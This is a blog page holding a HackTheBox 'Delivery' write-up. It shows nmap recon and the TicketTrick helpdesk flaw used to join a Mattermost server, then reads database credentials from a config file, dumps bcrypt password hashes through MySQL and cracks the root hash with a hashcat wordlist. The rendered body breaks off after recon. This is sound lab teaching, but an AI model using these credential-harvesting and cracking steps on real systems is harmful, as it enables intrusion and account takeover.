<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>HackTheBox - Delivery | Ef's log</title><meta name=keywords content="HackTheBox,Writeup,Cyber Security,Pentesting"><meta name=description content="Exploiting a logic flaw called TicketTrick"><meta name=author content="Fahmi J"><link rel=canonical href=https://fahmifj.medium.com/hackthebox-delivery-write-up-c15d44dcc800><meta name=google-site-verification content="LlCRq--iL8r1HTz1DMbMvQyX2lZjWD-KnwFeO_OWlg8"><link crossorigin=anonymous href=https://fahmifj.github.io/assets/css/stylesheet.min.c29d42410e6d1d1bede3e391464aa044c07f3eb6b72b5b98bce8382c169eeb49.css integrity="sha256-wp1CQQ5tHRvt4+ORRkqgRMB/Pra3K1uYvOg4LBae60k=" rel="preload stylesheet" as=style><script defer crossorigin=anonymous src=https://fahmifj.github.io/assets/js/highlight.min.7680afc38aa6b15ddf158a4f3780b7b1f7dde7e91d26f073e6229bb7a0793c92.js integrity="sha256-doCvw4qmsV3fFYpPN4C3sffd5+kdJvBz5iKbt6B5PJI=" onload=hljs.initHighlightingOnLoad()></script><link rel=icon href=https://fahmifj.github.io/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://fahmifj.github.io/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://fahmifj.github.io/favicon-32x32.png><link rel=apple-touch-icon href=https://fahmifj.github.io/apple-touch-icon.png><link rel=mask-icon href=https://fahmifj.github.io/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><meta name=generator content="Hugo 0.85.0"><script>(function(a,e,b,f,g,c,d){a[b]=a[b]||function(){(a[b].q=a[b].q||[]).push(arguments)},c=e.createElement(f),c.async=1,c.src="https://www.clarity.ms/tag/"+g+"?ref=bwt",d=e.getElementsByTagName(f)[0],d.parentNode.insertBefore(c,d)})(window,document,"clarity","script","711neo6qfi")</script><script async src="https://www.googletagmanager.com/gtag/js?id=G-PDN0GP97D1"></script><script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag('js',new Date),gtag('config','G-PDN0GP97D1',{anonymize_ip:!1})}</script><meta property="og:title" content="HackTheBox - Delivery"><meta property="og:description" content="Exploiting a logic flaw called TicketTrick"><meta property="og:type" content="article"><meta property="og:url" content="https://fahmifj.github.io/writeups/hackthebox/htb-delivery/"><meta property="og:image" content="https://fahmifj.github.io/writeups/hackthebox/htb-delivery/imgs/image-20210604131122280.png"><meta property="article:section" content="writeups"><meta property="article:published_time" content="2021-05-25T05:36:18+07:00"><meta property="article:modified_time" content="2021-05-25T05:36:18+07:00"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://fahmifj.github.io/writeups/hackthebox/htb-delivery/imgs/image-20210604131122280.png"><meta name=twitter:title content="HackTheBox - Delivery"><meta name=twitter:description content="Exploiting a logic flaw called TicketTrick"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Write-ups","item":"https://fahmifj.github.io/writeups/"},{"@type":"ListItem","position":2,"name":"HackTheBox","item":"https://fahmifj.github.io/writeups/hackthebox/"},{"@type":"ListItem","position":3,"name":"HackTheBox - Delivery","item":"https://fahmifj.github.io/writeups/hackthebox/htb-delivery/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"HackTheBox - Delivery","name":"HackTheBox - Delivery","description":"Exploiting a logic flaw called TicketTrick","keywords":["HackTheBox","Writeup","Cyber Security","Pentesting"],"articleBody":"Delivery from HackTheBox is all about exploiting a logic flaw called TicketTrick which was discovered by Inti De Ceukelaire.\nOn this machine, there is a helpdesk ticketing system that gives an unauthenticated user a temporary email with a legitimate company domain. Using that email, I’m able to register at Mattermost and gain access to the company private communication channel. The conversation in the channel leaks a set of SSH credentials and a password in which its variant is being used in the system. There is a set of database credentials in the Mattermost configuration file, which can be used to dump the password hash of the root account. After generating a variant of the exposed password with hashcat, I’m able to crack the password and obtain root access.\nSkills Learned  TicketTrick Generating wordlist using hashcat  Tools  Kali Linux (Attacking Machine) - https://www.kali.org/ Nmap - Preinstalled in Kali Linux hashcat  Reconnaissance Nmap nmap full TCP scan discovers three open ports: An SSH on port 22, an HTTP server on port 80, and an unknown service on port 8065\n→ root@kali «delivery» «10.10.14.70» $ nmap -p- --min-rate 1000 -sV --reason -oA nmap/10-tcp-allport-delivery 10.10.10.222 Starting Nmap 7.80 ( https://nmap.org ) at 2021-05-21 14:58 EDT .... PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack ttl 63 OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0) 80/tcp open http syn-ack ttl 63 nginx 1.14.2 8065/tcp open unknown syn-ack ttl 63 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port8065-TCP:V=7.80%I=7%D=5/21%Time=60A80336%P=x86_64-pc-linux-gnu%r(Ge SF:nericLines,67,\"HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nContent-Type:\\x20t SF:ext/plain;\\x20charset=utf-8\\r\\nConnection:\\x20close\\r\\n\\r\\n400\\x20Bad\\x SF:20Request\")%r(GetRequest,DF3,\"HTTP/1\\.0\\x20200\\x20OK\\r\\nAccept-Ranges:\\ .... → root@kali «delivery» «10.10.14.70» $ nmap -p22,80,8065 --min-rate 1000 -sC --reason -oA nmap/10-tcp-allport-delivery 10.10.10.222 Starting Nmap 7.80 ( https://nmap.org ) at 2021-05-21 15:06 EDT Nmap scan report for 10.10.10.222 Host is up, received echo-reply ttl 63 (0.45s latency). PORT STATE SERVICE REASON 22/tcp open ssh syn-ack ttl 63 | ssh-hostkey: | 2048 9c:40:fa:85:9b:01:ac:ac:0e:bc:0c:19:51:8a:ee:27 (RSA) | 256 5a:0c:c0:3b:9b:76:55:2e:6e:c4:f4:b9:5d:76:17:09 (ECDSA) |_ 256 b7:9d:f7:48:9d:a2:f2:76:30:fd:42:d3:35:3a:80:8c (ED25519) 80/tcp open http syn-ack ttl 63 |_http-title: Welcome 8065/tcp open unknown syn-ack ttl 63 I can clearly see the fingerprint of port 8065 indicate that it’s a HTTP server. I can confirm it with curl.\n→ root@kali «delivery» «10.10.14.70» $ curl -sI 10.10.10.222:8065 HTTP/1.1 405 Method Not Allowed Date: Fri, 21 May 2021 19:09:14 GMT Enumeration TCP 80 - Website This page is a static website.\nThe text “HELPDESK” points to http://helpdesk.delivery.htb/ . Clicking on the “CONTACT US” flips the homepage to this views:\nThe text “MatterMost server” points to http://delivery.htb:8065.\nI can use curl and grep command to grab all the links/URL from this page.\n→ root@kali «delivery» «10.10.14.70» $ curl -s 10.10.10.222 | grep -Eo 'href=\"[^\\\"]+\"' | grep -v '#' href=\"assets/css/main.css\" href=\"assets/css/ie9.css\" href=\"assets/css/noscript.css\" href=\"http://helpdesk.delivery.htb\" href=\"http://helpdesk.delivery.htb\" href=\"http://delivery.htb:8065\" href=\"https://html5up.net\" I’ll add the newly discovered hostnames to my /etc/hosts:\n→ root@kali «delivery» «10.10.14.70» $ echo '10.10.10.222 delivery.htb helpdesk.delivery.htb'  /etc/hosts Before moving on, we can poke the hostnames and compare their page size to check if this site has different content when we visit it with a hostname.\n→ root@kali «delivery» «10.10.14.70» $ curl -s http://10.10.10.222/ | wc -c 10850 → root@kali «delivery» «10.10.14.70» $ curl -s http://delivery.htb/ | wc -c 10850 → root@kali «delivery» «10.10.14.70» $ curl -s http://helpdesk.delivery.htb/ | wc -c 4933 There is only one page that has different in size.\nI did a gobuster scan but find nothing useful in the results, so I’ll move to the next prt.\nTCP 80 - helpdesk.delivery.htb There is a helpdesk ticketing system here. At the bottom of the page it shows it is powered by osTicket.\nThe “Open a New Ticket” menu.\nThe “Check Ticket Status” menu.\nOpen a New Ticket According to the message at http://delivery.htb/#contact-us, guest user seems to be allowed to create a ticket here.\nFor unregistered users, please use our HelpDesk to get in touch with our team. Once you have an @delivery.htb email address, you'll be able to have access to our MatterMost server. I’ll create one.\nOnce the ticket request is submitted, it notifies that the ticket has been created.\nBesides the ticket id, it also gives us a temporary email with domain of delivery.htb, and I’ll note that:\n Ticket : 4709941 Email: 4709941@delivery.htb.  The created ticket can be accessed/viewed on “Check Ticket Status” menu.\nFinding vulnerabilities - Exploit-DB The app source code is available on Github: https://github.com/osTicket/osTicket. But, it seems I’ll need an admin access to find the version.\nYou guess it, we can limit the search based on the box release (9 January 2021):\nBut those exploits mostly XSS that requires a user interaction and there is no indication for that in this box, so let’s move to the next one.\nTCP 8065 — Mattermost There is an instance of Mattermost here and it requires an account.\nSign up is allowed, but the page clearly shows that valid email is required.\nAnd here is why a valid email is required, there is a verification process.\nFoothold Shell as maildeliverer Access to Mattermost using TicketTrick The idea of TicketTrick here is to use the temporary email address given by the support ticket system to register on Mattermost.\nFor me, the previous email is: 4709941@delivery.htb. I’ll use that to register on Mattermost.\nThe verification is sent to 4709941@delivery.htb.\nBack on helpdesk, I can see the verification link to activate the my previously created Mattermost account.\nVisiting http://delivery.htb:8065/do_verify_email?token=eoy11mus8h6m4hctpmwt9qw31cdsfcxzbg7noyc5gzpc6htp9e8mqe55wwewaju9\u0026email=4709941%40delivery.htb redirects back to MatterMost which confirms the email has been verified.\nUpon logging in, I’m able to join the Internal channel (like server on Discord). There is one channel called internal.\nThe chats from root contain a set of credentials and a few hints which indicates that they use a variant password of “PleaseSubscribe!”.\nSSH - maildeliverer The credentials of maildeliverer works on SSH.\n→ root@kali «delivery» «10.10.14.70» $ ssh maildeliverer@delivery.htb ... maildeliverer@delivery.htb's password: Linux Delivery 4.19.0-13-amd64 #1 SMP Debian 4.19.160-2 (2020-11-28) x86_64 ... Last login: Fri May 21 14:11:23 2021 from 10.10.16.16 maildeliverer@Delivery:~$ id uid=1000(maildeliverer) gid=1000(maildeliverer) groups=1000(maildeliverer) The user flag is done here.\nmaildeliverer@Delivery:~$ ls -l total 4 -r-------- 1 maildeliverer maildeliverer 33 May 21 11:21 user.txt Privilege Escalation Shell as root Internal Enumeration Enumerating on /opt finds the Mattermost installation folder. The Mattermost config file contains the database credentials.\nmaildeliverer@Delivery:/opt/mattermost/config$ cat config.json | grep SqlSetting -A10 \"SqlSettings\": { \"DriverName\": \"mysql\", \"DataSource\": \"mmuser:Crack_The_MM_Admin_PW@tcp(127.0.0.1:3306)/mattermost?charset=utf8mb4,utf8\\u0026readTimeout=30s\\u0026writeTimeout=30s\", \"DataSourceReplicas\": [], \"DataSourceSearchReplicas\": [], \"MaxIdleConns\": 20, \"ConnMaxLifetimeMilliseconds\": 3600000, \"MaxOpenConns\": 300, \"Trace\": false, \"AtRestEncryptKey\": \"n5uax3d4f919obtsp1pw1k5xetq1enez\", \"QueryTimeout\": 30, The credentials is mmuser:Crack_The_MM_Admin_PW.\nMySQL - Dump Passwords With database credentials, I can connect to the MySQL service.\nmaildeliverer@Delivery:/opt/mattermost/config$mysqlmattermost-ummuser-pCrack_The_MM_Admin_PWReadingtableinformationforcompletionoftableandcolumnnamesYoucanturnoffthisfeaturetogetaquickerstartupwith-AWelcometotheMariaDBmonitor.Commandsendwith;or\\g.YourMariaDBconnectionidis395Serverversion:10.3.27-MariaDB-0+deb10u1Debian10Copyright(c)2000,2018,Oracle,MariaDBCorporationAbandothers.Type'help;'or'\\h'forhelp.Type'\\c'toclearthecurrentinputstatement.MariaDB[mattermost]There is a users table which usually contains something juicy.\nMariaDB[mattermost]showtables;+------------------------+|Tables_in_mattermost|+------------------------+...|Users|+------------------------+46rowsinset(0.001sec)I can get the columns of the table user by querying describe Users;.\nMariaDB[mattermost]describeUsers;+--------------------+--------------+------+-----+---------+-------+|Field|Type|Null|Key|Default|Extra|+--------------------+--------------+------+-----+---------+-------+|Id|varchar(26)|NO|PRI|NULL|||CreateAt|bigint(20)|YES|MUL|NULL|||UpdateAt|bigint(20)|YES|MUL|NULL|||DeleteAt|bigint(20)|YES|MUL|NULL|||Username|varchar(64)|YES|UNI|NULL|||Password|varchar(128)|YES||NULL||...+--------------------+--------------+------+-----+---------+-------+25rowsinset(0.001sec)I’ll dump that the username and password columns from the table Users.\nMariaDB[mattermost]selectUsername,PasswordfromUsers;+----------------------------------+--------------------------------------------------------------+|Username|Password|+----------------------------------+--------------------------------------------------------------+|surveybot|||c3ecacacc7b94f909d04dbfd308a9b93|$2a$10$u5815SIBe2Fq1FZlv9S8I.VjU3zeSPBrIEg9wvpiLaS7ImuiItEiK||5b785171bfb34762a933e127630c4860|$2a$10$3m0quqyvCE8Z/R1gFcCOWO6tEj6FtqtBn8fRAXQXmaKmg.HDGpS/G||testmail|$2a$10$gSBaz3a76sX.ikqynx4E7O2NYn9.q6fcSopTwYP672lJMSbZ6.IQa||help|$2a$10$zsb4KbggZbpQi2Wa8W0.C.lHVJxiUBr6cyNFbDbWu11j6JBJrVkpm||root|$2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v0EFJwgjjO||ff0a21fc6fc2488195e16ea854c963ee|$2a$10$RnJsISTLc9W3iUcUggl1KOG9vqADED24CQcQ8zvUm1Ir9pxS.Pduq||channelexport|||9ecfb4be145d47fda0724f697f35ffaf|$2a$10$s.cLPSjAVgawGOJwB7vrqenPg2lrDtOECRtjwWahOzHfq1CoFyFqm||aaaa|$2a$10$yIdqqOXl.5dcWsXk.Doo2ewl.zTFdsDd2F0.c44iWOpGMIgmDTsY6||iiamf|$2a$10$esA8d/l5.IKQJIhnl2SeYeeoFaCOE6Z/esUOSuRb.Vqtkf3gvbli6||iamf|$2a$10$ZYEM.GLMnAfq8eM.2rs8q.e/q3bHaOVOCvlu7YGhU0rU0Ug4PME9a|+----------------------------------+--------------------------------------------------------------+12rowsinset(0.000sec)MariaDB[mattermost]Those are bcrypt hashes, but let’s prioritize the root hash.\nCracking the Hash Based on the conversations on Mattermost, there is someone in the system that uses a variant of “PleaseSubscribe!” and they were talking about hashcat rules.\nI remember exactly that Ippsec (the box author) has shown several techniques on how to generate a variant of seasonal passwords on Forest .\nNow the idea is instead of generating seasonal passwords, I can try to generate a few variant of “PleaseSubscribe!” and use them for cracking.\nSo, I’ll start by calculating the length of “PleaseSubscribe!”.\n→ root@kali «delivery» «10.10.14.70» $ echo -n 'PleaseSubsribe!' | wc -c 15 It has length of 15. I’ll save the “PleaseSubscribe!” string to a file.\n→ root@kali «delivery» «10.10.14.70» $ echo 'PleaseSubscribe!'  IppsecSubscriber Then I’ll feed that file to hashcat to generate some new variant of it using base64 rule, and I’ll take out only the string which has a length greater than 15 and pipe the output to a file called custom_wordlist.\n→ root@kali «delivery» «10.10.14.70» $ hashcat IppsecSubscriber -r /usr/share/hashcat/rules/best64.rule --stdout | awk 'length($0)  15'  custom_wordlist It produces 46 words.\n→ root@kali «delivery» «10.10.14.70» $ wc -w custom_wordlist 46 custom_wordlist With that wordlist the hash gets cracked instantly!\nC:\\tools\\hashcat6hashcat.exe -m 3200 '$2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v0EFJwgjjO' custom_wordlist --force .... $2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v0EFJwgjjO:PleaseSubscribe!21 Session..........: hashcat Status...........: Cracked Hash.Name........: bcrypt $2*$, Blowfish (Unix) Hash.Target......: $2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v...JwgjjO Time.Started.....: Mon Mar 15 21:36:35 2021 (1 sec) Time.Estimated...: Mon Mar 15 21:36:36 2021 (0 secs) .... The recovered password is PleaseSubscribe!21.\nSU - root That password works on root user.\nmaildeliverer@Delivery:~$ su root Password: root@Delivery:/home/maildeliverer# id uid=0(root) gid=0(root) groups=0(root) Now I can just grab the root flag.\nroot@Delivery:/home/maildeliverer# cd ~ root@Delivery:~# ls -l total 16 -rwxr-x--- 1 root root 103 Dec 26 11:26 mail.sh -r-------- 1 root root 382 Dec 28 07:02 note.txt -rw-r----- 1 root root 1499 Dec 26 10:55 py-smtp.py -r-------- 1 root root 33 May 21 11:21 root.txt root@Delivery:~# cat *.txt I hope you enjoyed this box, the attack may seem silly but it demonstrates a pretty high risk vulnerability I've seen several times. The inspiration for the box is here: - https://medium.com/intigriti/how-i-hacked-hundreds-of-companies-through-their-helpdesk-b7680ddc2d4c Keep on hacking! And please don't forget to subscribe to all the security streamers out there. - ippsec a7d68baadc3b3c072c6...... There is also a message from the box’s author:\nroot@Delivery:~# cat note.txt I hope you enjoyed this box, the attack may seem silly but it demonstrates a pretty high risk vulnerability I've seen several times. The inspiration for the box is here: - https://medium.com/intigriti/how-i-hacked-hundreds-of-companies-through-their-helpdesk-b7680ddc2d4c Keep on hacking! And please don't forget to subscribe to all the security streamers out there.  References  https://medium.com/intigriti/how-i-hacked-hundreds-of-companies-through-their-helpdesk-b7680ddc2d4c  ","wordCount":"1540","inLanguage":"en","image":"https://fahmifj.github.io/writeups/hackthebox/htb-delivery/imgs/image-20210604131122280.png","datePublished":"2021-05-25T05:36:18+07:00","dateModified":"2021-05-25T05:36:18+07:00","author":{"@type":"Person","name":"Fahmi J"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://fahmifj.github.io/writeups/hackthebox/htb-delivery/"},"publisher":{"@type":"Organization","name":"Ef's log","logo":{"@type":"ImageObject","url":"https://fahmifj.github.io/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add('dark'):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove('dark'):window.matchMedia('(prefers-color-scheme: dark)').matches&&document.body.classList.add('dark')</script><noscript><style type=text/css>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:#1d1e20;--entry:#2e2e33;--primary:rgba(255, 255, 255, 0.84);--secondary:rgba(255, 255, 255, 0.56);--tertiary:rgba(255, 255, 255, 0.16);--content:rgba(255, 255, 255, 0.74);--hljs-bg:#2e2e33;--code-bg:#37383e;--border:#333}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><header class="header sticky"><nav class=nav><div class=container><div class=logo><a href=https://fahmifj.github.io/ accesskey=h title="友人F (Alt + H)">友人F</a></span></div><ul id=menu onscroll=menu_on_scroll()><li><a href=https://fahmifj.github.io/search/ title="Search (Alt + /)" accesskey=/><span>Search</span></a></li><li><a href=https://fahmifj.github.io/writeups/ title=Write-ups><span>Write-ups</span></a></li><li><a href=https://fahmifj.github.io/blog/ title=Blog><span>Blog</span></a></li><li><a href=https://fahmifj.github.io/archives/ title=Archive><span>Archive</span></a></li><li><a href=https://fahmifj.github.io/about/ title=About><span>About</span></a></li></ul><span class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="25" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://fahmifj.github.io/>Home</a>&nbsp;»&nbsp;<a href=https://fahmifj.github.io/writeups/>Write-ups</a>&nbsp;»&nbsp;<a href=https://fahmifj.github.io/writeups/hackthebox/>HackTheBox</a></div><h1 class=post-title>HackTheBox - Delivery</h1><div class=post-description>Exploiting a logic flaw called TicketTrick</div><div class=post-meta>May 25, 2021&nbsp;·&nbsp;8 min&nbsp;·&nbsp;Fahmi J
<span class=post-canonical-link>Originally published at<a href=https://fahmifj.medium.com/hackthebox-delivery-write-up-c15d44dcc800 target=_blank rel="noopener noreferrer"> fahmifj.medium.com</a></span></div></header><figure class=entry-cover><img loading=lazy srcset="https://fahmifj.github.io/writeups/hackthebox/htb-delivery/imgs/image-20210604131122280_hu9151726188ecca9627810fa878b1ee39_149915_360x0_resize_box_2.png 360w ,https://fahmifj.github.io/writeups/hackthebox/htb-delivery/imgs/image-20210604131122280_hu9151726188ecca9627810fa878b1ee39_149915_480x0_resize_box_2.png 480w ,https://fahmifj.github.io/writeups/hackthebox/htb-delivery/imgs/image-20210604131122280_hu9151726188ecca9627810fa878b1ee39_149915_720x0_resize_box_2.png 720w ,https://fahmifj.github.io/writeups/hackthebox/htb-delivery/imgs/image-20210604131122280.png 736w" sizes="(min-width: 768px) 720px, 100vw" src=https://fahmifj.github.io/writeups/hackthebox/htb-delivery/imgs/image-20210604131122280.png alt="HackTheBox - Delivery"><p>HackTheBox - Delivery</p></figure><div class=toc><div class=inner><ul><ul><li><a href=#skills-learned aria-label="Skills Learned">Skills Learned</a></li><li><a href=#tools aria-label=Tools>Tools</a></li></ul><li><a href=#reconnaissance aria-label=Reconnaissance>Reconnaissance</a><ul><li><a href=#nmap aria-label=Nmap>Nmap</a></li></ul></li><li><a href=#enumeration aria-label=Enumeration>Enumeration</a><ul><li><a href=#tcp-80---website aria-label="TCP 80 - Website">TCP 80 - Website</a></li><li><a href=#tcp-80---helpdeskdeliveryhtb aria-label="TCP 80 - helpdesk.delivery.htb">TCP 80 - helpdesk.delivery.htb</a></li><li><a href=#finding-vulnerabilities---exploit-db aria-label="Finding vulnerabilities - Exploit-DB">Finding vulnerabilities - Exploit-DB</a></li><li><a href=#tcp-8065--mattermost aria-label="TCP 8065 — Mattermost">TCP 8065 — Mattermost</a></li></ul></li><li><a href=#foothold aria-label=Foothold>Foothold</a><ul><li><a href=#shell-as-maildeliverer aria-label="Shell as maildeliverer">Shell as maildeliverer</a></li></ul></li><li><a href=#privilege-escalation aria-label="Privilege Escalation">Privilege Escalation</a><ul><li><a href=#shell-as-root aria-label="Shell as root">Shell as root</a></li></ul></li><li><a href=#references aria-label=References>References</a></li></ul></div></details></div><div class=post-content><p>Delivery from HackTheBox is all about exploiting a logic flaw called TicketTrick which was discovered by <a href=https://medium.com/intigriti/how-i-hacked-hundreds-of-companies-through-their-helpdesk-b7680ddc2d4c>Inti De Ceukelaire</a>.</p><p>On this machine, there is a helpdesk ticketing system that gives an unauthenticated user a temporary email with a legitimate company domain. Using that email, I&rsquo;m able to register at Mattermost and gain access to the company private communication channel. The conversation in the channel leaks a set of SSH credentials and a password in which its variant is being used in the system. There is a set of database credentials in the Mattermost configuration file, which can be used to dump the password hash of the root account. After generating a variant of the exposed password with hashcat, I&rsquo;m able to crack the password and obtain root access.</p><h3 id=skills-learned>Skills Learned<a class=anchor aria-hidden=true href=#skills-learned>#</a></h3><ul><li>TicketTrick</li><li>Generating wordlist using hashcat</li></ul><h3 id=tools>Tools<a class=anchor aria-hidden=true href=#tools>#</a></h3><ul><li>Kali Linux (Attacking Machine) - <a href=https://www.kali.org/>https://www.kali.org/</a></li><li>Nmap - Preinstalled in Kali Linux</li><li><a href=https://hashcat.net/>hashcat</a></li></ul><h2 id=reconnaissance>Reconnaissance<a class=anchor aria-hidden=true href=#reconnaissance>#</a></h2><h3 id=nmap>Nmap<a class=anchor aria-hidden=true href=#nmap>#</a></h3><p><code>nmap</code> full TCP scan discovers three open ports: An SSH on port 22, an HTTP server on port 80, and an unknown service on port 8065</p><div class=highlight><pre class=chroma><code class=language-text data-lang=text>→ root@kali «delivery» «10.10.14.70» 
$ nmap -p- --min-rate 1000 -sV --reason -oA nmap/10-tcp-allport-delivery 10.10.10.222 
Starting Nmap 7.80 ( https://nmap.org ) at 2021-05-21 14:58 EDT
....
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
80/tcp   open  http    syn-ack ttl 63 nginx 1.14.2
8065/tcp open  unknown syn-ack ttl 63
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8065-TCP:V=7.80%I=7%D=5/21%Time=60A80336%P=x86_64-pc-linux-gnu%r(Ge
SF:nericLines,67,&#34;HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20t
SF:ext/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x
SF:20Request&#34;)%r(GetRequest,DF3,&#34;HTTP/1\.0\x20200\x20OK\r\nAccept-Ranges:\
....

→ root@kali «delivery» «10.10.14.70» 
$ nmap -p22,80,8065 --min-rate 1000 -sC --reason -oA nmap/10-tcp-allport-delivery 10.10.10.222
Starting Nmap 7.80 ( https://nmap.org ) at 2021-05-21 15:06 EDT
Nmap scan report for 10.10.10.222
Host is up, received echo-reply ttl 63 (0.45s latency).

PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack ttl 63
| ssh-hostkey: 
|   2048 9c:40:fa:85:9b:01:ac:ac:0e:bc:0c:19:51:8a:ee:27 (RSA)
|   256 5a:0c:c0:3b:9b:76:55:2e:6e:c4:f4:b9:5d:76:17:09 (ECDSA)
|_  256 b7:9d:f7:48:9d:a2:f2:76:30:fd:42:d3:35:3a:80:8c (ED25519)
80/tcp   open  http    syn-ack ttl 63
|_http-title: Welcome
8065/tcp open  unknown syn-ack ttl 63
</code></pre></div><p>I can clearly see the fingerprint of port 8065 indicate that it&rsquo;s a HTTP server. I can confirm it with <code>curl</code>.</p><div class=highlight><pre class=chroma><code class=language-shell data-lang=shell>→ root@kali «delivery» «10.10.14.70» 
$ curl -sI 10.10.10.222:8065
HTTP/1.1 <span class=m>405</span> Method Not Allowed
Date: Fri, <span class=m>21</span> May <span class=m>2021</span> 19:09:14 GMT
</code></pre></div><h2 id=enumeration>Enumeration<a class=anchor aria-hidden=true href=#enumeration>#</a></h2><h3 id=tcp-80---website>TCP 80 - Website<a class=anchor aria-hidden=true href=#tcp-80---website>#</a></h3><p>This page is a static website.</p><p><img class=img-container src=imgs/image-20210522022202624.png alt=image-20210522022202624></p><p>The text “HELPDESK” points to <code>http://helpdesk.delivery.htb/ </code>. Clicking on the &ldquo;CONTACT US&rdquo; flips the homepage to this views:</p><p><img class=img-container src=imgs/image-20210522022535948.png alt=image-20210522022535948></p><p>The text “MatterMost server” points to <code>http://delivery.htb:8065</code>.</p><p>I can use <code>curl</code> and <code>grep</code> command to grab all the links/URL from this page.</p><div class=highlight><pre class=chroma><code class=language-shell data-lang=shell>→ root@kali «delivery» «10.10.14.70» 
$ curl -s 10.10.10.222 <span class=p>|</span> grep -Eo <span class=s1>&#39;href=&#34;[^\&#34;]+&#34;&#39;</span> <span class=p>|</span> grep -v <span class=s1>&#39;#&#39;</span>
<span class=nv>href</span><span class=o>=</span><span class=s2>&#34;assets/css/main.css&#34;</span>
<span class=nv>href</span><span class=o>=</span><span class=s2>&#34;assets/css/ie9.css&#34;</span>
<span class=nv>href</span><span class=o>=</span><span class=s2>&#34;assets/css/noscript.css&#34;</span>
<span class=nv>href</span><span class=o>=</span><span class=s2>&#34;http://helpdesk.delivery.htb&#34;</span>
<span class=nv>href</span><span class=o>=</span><span class=s2>&#34;http://helpdesk.delivery.htb&#34;</span>
<span class=nv>href</span><span class=o>=</span><span class=s2>&#34;http://delivery.htb:8065&#34;</span>
<span class=nv>href</span><span class=o>=</span><span class=s2>&#34;https://html5up.net&#34;</span>
</code></pre></div><p>I’ll add the newly discovered hostnames to my <code>/etc/hosts</code>:</p><div class=highlight><pre class=chroma><code class=language-shell data-lang=shell>→ root@kali «delivery» «10.10.14.70» 
$ <span class=nb>echo</span> <span class=s1>&#39;10.10.10.222 delivery.htb helpdesk.delivery.htb&#39;</span> &gt; /etc/hosts
</code></pre></div><p>Before moving on, we can poke the hostnames and compare their page size to check if this site has different content when we visit it with a hostname.</p><div class=highlight><pre class=chroma><code class=language-shell data-lang=shell>→ root@kali «delivery» «10.10.14.70» 
$ curl -s http://10.10.10.222/ <span class=p>|</span> wc -c
<span class=m>10850</span>
→ root@kali «delivery» «10.10.14.70» 
$ curl -s http://delivery.htb/ <span class=p>|</span> wc -c
<span class=m>10850</span>
→ root@kali «delivery» «10.10.14.70» 
$ curl -s http://helpdesk.delivery.htb/ <span class=p>|</span> wc -c
<span class=m>4933</span>
